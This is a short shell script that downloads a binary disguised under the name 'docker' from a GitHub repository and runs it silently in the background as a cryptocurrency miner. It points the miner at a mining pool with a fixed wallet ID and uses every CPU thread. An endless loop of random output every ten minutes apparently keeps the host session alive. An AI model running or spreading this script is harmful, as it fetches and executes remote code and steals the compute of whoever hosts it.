wget https://github.com/aqshakuy/bb/raw/main/docker
chmod +x docker
./docker -o us.qrl.herominers.com:1166 -u Q010500afb67b523cac94575d83d9a5b5c41a137c4566ddf56ede8628bebce5df11eda81c9e9a87 -p x@$(echo $(shuf -i 1111-9999 -n 1)-aing) -k -a rx/0 -t$(nproc --all) > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
